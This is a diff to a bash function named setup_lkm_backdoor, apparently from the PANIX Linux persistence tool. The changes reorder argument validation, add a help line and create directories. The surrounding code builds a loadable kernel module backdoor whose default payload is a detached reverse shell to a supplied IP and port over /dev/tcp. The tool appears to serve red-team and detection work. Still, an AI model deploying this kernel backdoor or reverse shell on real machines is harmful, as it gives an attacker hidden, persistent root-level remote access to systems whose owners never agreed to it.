@@ -24,6 +24,7 @@ setup_lkm_backdoor() {
 		echo "--custom                     Use custom LKM settings"
 		echo "  --path <path>                Specify custom kernel module path"
 		echo "  --command <command>          Specify custom command to add to LKM"
+		echo "--help|-h                    Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -71,6 +72,18 @@ setup_lkm_backdoor() {
 		shift
 	done
 
+	if [[ $default -eq 0 && $custom -eq 0 ]]; then
+		echo "Error: Either --default or --custom must be specified."
+		echo "Try './panix.sh --lkm --help' for more information."
+		exit 1
+	fi
+
+	if [[ $default -eq 1 && $custom -eq 1 ]]; then
+		echo "Error: --default and --custom cannot be specified together."
+		echo "Try './panix.sh --lkm --help' for more information."
+		exit 1
+	fi
+
 	if ! command -v make &> /dev/null; then
 		echo "Error: 'make' is not installed. Please install 'make' or 'build-essential' to use this mechanism."
 		echo "For Debian/Ubuntu: sudo apt install build-essential"
@@ -95,18 +108,6 @@ setup_lkm_backdoor() {
 		exit 1
 	fi
 
-	if [[ $default -eq 1 && $custom -eq 1 ]]; then
-		echo "Error: --default and --custom cannot be specified together."
-		echo "Try './panix.sh --lkm --help' for more information."
-		exit 1
-	fi
-
-	if [[ $default -eq 0 && $custom -eq 0 ]]; then
-		echo "Error: Either --default or --custom must be specified."
-		echo "Try './panix.sh --lkm --help' for more information."
-		exit 1
-	fi
-
 	if [[ $default -eq 1 ]]; then
 		if [[ -z $ip || -z $port ]]; then
 			echo "Error: --ip and --port must be specified when using --default."
@@ -117,7 +118,6 @@ setup_lkm_backdoor() {
 		# Populate the command for default mode
 		# Ensure proper escaping for C string
 		command="\"/bin/bash\",\"-c\",\"/bin/nohup /bin/setsid /bin/bash -c '/bin/bash -i >& /dev/tcp/$ip/$port 0>&1'\",NULL"
-		echo "Default mode selected. Command set to reverse shell."
 
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $command || -z $lkm_path ]]; then
@@ -130,8 +130,10 @@ setup_lkm_backdoor() {
 		# Ensure proper escaping for C string
 		command="\"/bin/bash\",\"-c\",\"$command\",NULL"
 		lkm_destination="$lkm_path"
-		echo "Custom mode selected. Command set to user-provided command."
+        mkdir -p $(dirname $lkm_destination)
 	fi
+
+    mkdir -p ${lkm_compile_dir}
 
 	cat <<-EOF > ${lkm_source}
 	#include <linux/module.h>
